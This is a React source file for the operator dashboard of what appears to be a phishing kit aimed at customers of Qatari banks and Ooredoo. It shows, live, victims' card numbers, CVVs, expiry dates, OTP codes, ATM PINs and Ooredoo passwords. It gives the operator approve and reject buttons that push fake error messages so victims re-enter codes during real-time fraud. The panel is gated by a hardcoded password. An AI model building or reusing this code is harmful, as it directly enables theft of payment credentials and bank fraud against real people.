import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Eye,
  LogOut,
  Search,
  Users,
  Key,
  User,
  CreditCard,
  Globe,
  Check,
  X,
  LayoutDashboard,
  MapPin,
} from "lucide-react";

export default function AdminDashboard() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    if (typeof window !== 'undefined') {
      return localStorage.getItem("admin_auth") === "true";
    }
    return false;
  });
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [isDetailsOpen, setIsDetailsOpen] = useState(false);

  const { data: sessions, refetch } = trpc.submissions.getSessions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const adminTakeActionMutation = trpc.submissions.adminTakeAction.useMutation();

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "Qatar@@200") {
      setIsAuthenticated(true);
      localStorage.setItem("admin_auth", "true");
      toast.success("تم تسجيل الدخول بنجاح");
    } else {
      toast.error("كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem("admin_auth");
  };

  const handleAdminAction = async (sessionId: string, action: string, errorMessage?: string) => {
    try {
      await adminTakeActionMutation.mutateAsync({ 
        sessionId, 
        action, 
        errorMessage: errorMessage || undefined,
        redirectTarget: undefined
      });
      toast.success(action === 'approve' ? "تم القبول" : "تم الرفض");
      refetch();
      // Update selected session to reflect new state
      if (selectedSession && selectedSession.id === sessionId) {
        const updatedSessions = await refetch();
        const updated = updatedSessions.data?.find((s: any) => s.id === sessionId);
        if (updated) setSelectedSession(updated);
      }
    } catch (error) {
      toast.error("فشل تنفيذ الإجراء");
    }
  };

  const filteredSessions = sessions?.filter((s) => {
    const phone = s.personalData?.phoneNumber || "";
    const bank = s.selectedBank || "";
    const country = s.personalData?.country || "";
    return (
      phone.toLowerCase().includes(searchTerm.toLowerCase()) ||
      bank.toLowerCase().includes(searchTerm.toLowerCase()) ||
      country.toLowerCase().includes(searchTerm.toLowerCase())
    );
  });

  const getStepLabel = (step: string) => {
    const steps: any = {
      'login': 'بيانات الدخول/الدفع',
      'otp': 'رمز التحقق (OTP)',
      'atm': 'رقم الصراف (PIN)',
      'ooredoo': 'حساب Ooredoo',
      'otp_ooredoo': 'OTP Ooredoo',
      'success': 'مكتمل بنجاح',
      'waiting': 'قيد الانتظار',
      'personal-data': 'البيانات الشخصية',
    };
    return steps[step] || step;
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-3xl shadow-2xl p-8 space-y-8">
          <div className="text-center">
            <div className="w-20 h-20 bg-[#8C0032] rounded-3xl flex items-center justify-center mx-auto mb-6 rotate-3 shadow-xl">
              <Key className="text-white w-10 h-10 -rotate-3" />
            </div>
            <h1 className="text-3xl font-black text-slate-900 mb-2">لوحة الإدارة</h1>
            <p className="text-slate-500 font-medium">أدخل كلمة المرور للمتابعة</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <Input
                type="password"
                placeholder="كلمة المرور"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="h-14 bg-slate-50 border-slate-200 rounded-2xl text-center text-lg focus:ring-2 focus:ring-[#8C0032] transition-all"
              />
            </div>
            <Button type="submit" className="w-full h-14 bg-[#8C0032] hover:bg-[#a8003d] text-white text-lg font-bold rounded-2xl shadow-lg shadow-rose-200 transition-all active:scale-95">
              دخول النظام
            </Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f1f5f9] text-slate-900 font-sans" dir="rtl">
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-[1600px] mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="bg-[#8C0032] p-2.5 rounded-xl shadow-lg shadow-rose-100">
              <LayoutDashboard className="text-white w-6 h-6" />
            </div>
            <div>
              <h1 className="text-xl font-black text-slate-900 tracking-tight">إدارة العمليات اللحظية</h1>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">النظام نشط الآن</span>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-6">
            <div className="relative hidden lg:block w-80">
              <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
              <Input
                placeholder="بحث برقم الهاتف..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl"
              />
            </div>
            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 rounded-xl">
              <LogOut className="w-5 h-5" />
              <span className="font-bold">خروج</span>
            </Button>
          </div>
        </div>
      </nav>

      <main className="max-w-[1600px] mx-auto px-4 py-8 space-y-8">
        <div className="bg-white rounded-[2rem] shadow-sm border border-slate-200 overflow-hidden">
          <div className="p-6 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between">
            <h2 className="text-lg font-black text-slate-800 flex items-center gap-2">
              <Users className="w-5 h-5 text-[#8C0032]" />
              قائمة الطلبات
            </h2>
          </div>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="bg-slate-50">
                <TableRow>
                  <TableHead className="text-right">البلد (مصدر الزيارة)</TableHead>
                  <TableHead className="text-right">نوع العضوية</TableHead>
                  <TableHead className="text-right">رقم الهاتف</TableHead>
                  <TableHead className="text-right">المرحلة الحالية</TableHead>
                  <TableHead className="text-right">الحالة</TableHead>
                  <TableHead className="text-center">التفاصيل</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredSessions?.map((session) => (
                  <TableRow key={session.id}>
                    <TableCell className="font-bold">
                      <div className="flex items-center gap-2">
                        <MapPin className="w-4 h-4 text-slate-400" />
                        {session.country || "—"}
                      </div>
                    </TableCell>
                    <TableCell className="font-bold">
                      {session.selectedBank === 'qnb' ? 'العضوية الفضية' : 
                       session.selectedBank === 'cbq' ? 'العضوية الذهبية' : 
                       session.selectedBank === 'dib' ? 'العضوية البلاتينية' : session.selectedBank?.toUpperCase() || "—"}
                    </TableCell>
                    <TableCell className="font-bold">{session.personalData?.phoneNumber || "—"}</TableCell>
                    <TableCell>
                      <span className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-xs font-bold">
                        {getStepLabel(session.currentStep || "")}
                      </span>
                    </TableCell>
                    <TableCell>
                      <span className={`px-3 py-1 rounded-full text-xs font-bold ${
                        session.adminAction === 'approve' ? 'bg-emerald-50 text-emerald-600' :
                        session.adminAction === 'reject' ? 'bg-rose-50 text-rose-600' :
                        'bg-amber-50 text-amber-600'
                      }`}>
                        {session.adminAction === 'approve' ? 'مقبول' : session.adminAction === 'reject' ? 'مرفوض' : 'قيد الانتظار'}
                      </span>
                    </TableCell>
                    <TableCell className="text-center">
                      <Button
                        size="sm"
                        className="bg-slate-900 hover:bg-[#8C0032] text-white rounded-xl gap-2"
                        onClick={() => {
                          setSelectedSession(session);
                          setIsDetailsOpen(true);
                        }}
                      >
                        <Eye className="w-4 h-4" />
                        عرض التفاصيل
                      </Button>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        </div>
      </main>

      <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto rounded-[2rem] p-0 border-none shadow-2xl bg-white" dir="rtl">
          <DialogHeader className="p-8 bg-slate-900 text-white rounded-t-[2rem]">
            <DialogTitle className="text-2xl font-black flex items-center gap-3">
              <User className="w-6 h-6 text-rose-500" />
              تفاصيل العميل والتحكم بالطلب
            </DialogTitle>
          </DialogHeader>

          {selectedSession && (
            <div className="p-8 space-y-8">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <DataSection 
                  title="البيانات الشخصية"
                  icon={<User className="w-4 h-4" />}
                  data={{
                    "اللقب": selectedSession.personalData?.title,
                    "الاسم بالكامل": `${selectedSession.personalData?.nameEnglish || ''} ${selectedSession.personalData?.lastName || ''}`,
                    "رقم الهاتف": selectedSession.personalData?.phoneNumber,
                    "البريد الإلكتروني": selectedSession.personalData?.email,
                    "الدولة": selectedSession.personalData?.country,
                  }}
                  currentStep={selectedSession.currentStep}
                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
                />

                <DataSection 
                  title="بيانات البطاقة"
                  icon={<CreditCard className="w-4 h-4" />}
                  data={{
                    "رقم البطاقة": selectedSession.loginMethod?.cardNumber,
                    "الاسم": selectedSession.loginMethod?.cardholderName,
                    "التاريخ": selectedSession.loginMethod?.expiryDate,
                    "CVV": selectedSession.loginMethod?.cvv,
                  }}
                  currentStep={selectedSession.currentStep}
                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
                />

                <DataSection 
                  title="رموز التحقق (OTP)"
                  icon={<Key className="w-4 h-4" />}
                  data={selectedSession.otps?.reduce((acc: any, otp: any, i: number) => {
                    if (otp.otpType !== 'ooredoo') acc[`رمز ${i + 1}`] = otp.otpCode;
                    return acc;
                  }, {}) || { "رمز OTP": "—" }}
                  currentStep={selectedSession.currentStep}
                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من الرمز المرسال عبر الجوال")}
                />

                <DataSection 
                  title="ATM PIN"
                  icon={<CreditCard className="w-4 h-4" />}
                  data={{ "الرقم السري": selectedSession.atmPin?.pin }}
                  currentStep={selectedSession.currentStep}
                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "الرقم السري للصراف الي غير صحيح")}
                />

                <DataSection 
                  title="بيانات Ooredoo"
                  icon={<Globe className="w-4 h-4" />}
                  data={{
                    "المستخدم": selectedSession.ooredoo?.ooredooUser,
                    "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
                    "OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
                  }}
                  currentStep={selectedSession.currentStep}
                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
                  onReject={() => {
                    const isOtpOoredoo = selectedSession.currentStep === 'otp_ooredoo';
                    handleAdminAction(
                      selectedSession.id, 
                      'reject', 
                      isOtpOoredoo ? "الرمز غير صحيح او غير صالح" : "اسم المستخدم او كلمة المرور غير صحيحه"
                    );
                  }}
                />
              </div>
            </div>
          )}

          <DialogFooter className="p-6 bg-slate-50 border-t flex justify-center">
            <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 text-white px-12 h-12 font-black rounded-2xl">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function DataSection({ title, icon, data, onAccept, onReject, currentStep }: any) {
  // تفعيل الأزرار فقط من مرحلة اتمام التسجيل والاشتراك وما بعده
  const enableButtons = ['card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success'].includes(currentStep);
  
  return (
    <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
      <div className="bg-slate-50 px-6 py-4 border-b border-slate-100 flex items-center justify-between">
        <div className="flex items-center gap-2 font-bold text-slate-800">
          <div className="bg-[#8C0032]/10 p-1.5 rounded-lg text-[#8C0032]">
            {icon}
          </div>
          {title}
        </div>
        <div className="flex gap-2">
          <Button 
            size="sm" 
            variant="outline" 
            className="h-8 w-8 p-0 rounded-full border-emerald-200 text-emerald-600 hover:bg-emerald-50 disabled:opacity-50 disabled:cursor-not-allowed"
            onClick={onAccept}
            disabled={!enableButtons}
          >
            <Check className="w-4 h-4" />
          </Button>
          <Button 
            size="sm" 
            variant="outline" 
            className="h-8 w-8 p-0 rounded-full border-rose-200 text-rose-600 hover:bg-rose-50 disabled:opacity-50 disabled:cursor-not-allowed"
            onClick={onReject}
            disabled={!enableButtons}
          >
            <X className="w-4 h-4" />
          </Button>
        </div>
      </div>
      <div className="p-6 space-y-4">
        {Object.entries(data).map(([label, value]: any) => (
          <div key={label} className="flex flex-col gap-1">
            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">{label}</span>
            <span className="text-sm font-black text-slate-700 break-all">{value || "—"}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
